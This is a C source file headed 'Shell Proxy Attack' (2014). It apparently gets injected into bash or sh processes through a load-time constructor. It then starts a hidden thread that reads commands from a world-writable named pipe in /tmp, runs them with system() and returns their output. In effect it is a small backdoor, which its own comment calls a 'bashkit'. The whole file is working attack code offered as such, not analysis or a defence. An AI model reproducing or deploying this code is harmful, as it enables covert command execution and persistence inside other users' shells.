/*
 * Shell Proxy Attack
 *
 *
 * by Jeong JiHoon (2014. 12. 21)
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <link.h>
#include <sys/mman.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>

#define FOREVER 1

FILE *log_fd = NULL;

__attribute__ ((constructor)) void start(void);

unsigned int isBash = 0;
unsigned int isShell = 0;
int isThreadSpawned = 0;

int is_bash()
{
	FILE *fp;
	char path[256], proc_name[256]={0,};
	int readLen, pid = getpid();

    if(log_fd==NULL)
        log_fd = stderr;

	sprintf(path, "/proc/%d/cmdline", pid);

	fp = fopen(path, "r");
	if(fp)
	{
		readLen = fread(proc_name, 256, 1, fp);

        if(isShell==0 && !strncmp(proc_name, "-sh", 3) || !strncmp(proc_name, "ksh", 3) || strstr(proc_name, "bin/bash"))
            isShell = 1;

		if(strstr(proc_name, "/bin/bash"))
			isBash = 1;

		fclose(fp);	
	}
	else
		fprintf(log_fd, "[Injected Process] Failed to open %s\n", path);

	return isBash;
}

void * shell_proxy(void *ptr)
{
    int pid, fd, i;
    char buf[1024], cmd[1024];
    char *pipe_path = "/tmp/sproxy";

    while(FOREVER){
        memset(cmd, 0, 1024);
        memset(buf, 0, 1024);

        if(mkfifo(pipe_path, 0666)<0)
        {
            fprintf(log_fd, "[%s] failed to create pipe\n", __FUNCTION__);
            return NULL;
        }

        if((fd = open(pipe_path, O_RDWR))<0)
        {
            fprintf(log_fd, "[%s] failed to open pipe (path=%s)\n", __FUNCTION__, pipe_path);
            unlink(pipe_path);
            return NULL;
        }

        read(fd, buf, 1024);

        pid = fork();

        if(pid==0)
        {
            close(STDIN_FILENO);
            close(STDOUT_FILENO);
            close(STDERR_FILENO);

            dup2(fd, STDIN_FILENO);
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);

            system(buf);    

            close(fd);
            exit(0);
        }
        else
            wait(NULL);
 
        unlink(pipe_path);
        close(fd);
    }

    return NULL;
}

void start(void)
{
	unsigned int ret, pSFC;
    pthread_t th_handle;
	is_bash();

    // we run bashkit only against bash shell process
	if(isBash || isShell)
    {
        fprintf(log_fd, "[%s] start!\n", __FUNCTION__);
        ret = pthread_create(&th_handle, NULL, shell_proxy, NULL);

        if(ret==0)
            fprintf(log_fd, "[%s] shell_proxy thread created\n", __FUNCTION__);
    }
}
